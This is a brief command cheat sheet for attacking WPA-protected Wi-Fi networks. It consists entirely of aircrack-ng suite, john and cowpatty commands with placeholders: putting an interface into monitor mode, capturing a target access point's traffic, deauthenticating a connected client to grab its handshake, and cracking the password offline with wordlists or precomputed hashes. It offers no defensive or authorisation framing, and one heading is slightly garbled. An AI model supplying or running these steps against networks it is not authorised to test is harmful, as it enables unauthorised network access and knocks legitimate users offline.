**Start Interface**  
```bash
airmon-ng start <interface> <AP channel>  
```
  
**Start Dump Capture**  
```bash
airodump-ng -c <AP channel> --bssid <AP MAC> -w <capture> <interface>
```
  
  
**Deauthenticate connected Client to get -way handshake**  
```bash
aireplay-ng -0 1 -a <AP MAC> -c <Client MAC> <interface>  
```
  
**Crack WPA password with Aircrack**  
```bash
aircrack-ng -w <wordlist> <capture>  
```

**OR**  

```bash
aircrack-ng -r <db name> <capture>  
```

**OR**  

```bash
./john --wordlist=<wordlist> --rules --stdout | aircrack-ng -e <ESSID> -w - <capture>  
```

**OR**  

```bash
cowpatty -r <capture> -f <wordlist> -2 -s <ESSID>  
```

**OR FINALLY**  

```bash
genpmk -f <wordlist> -d <hashes filename> -s <ESSID>  
```

**WITH**  

```bash
cowpatty -r <capture> -d <hashes filename> -2 -s <ESSID>
```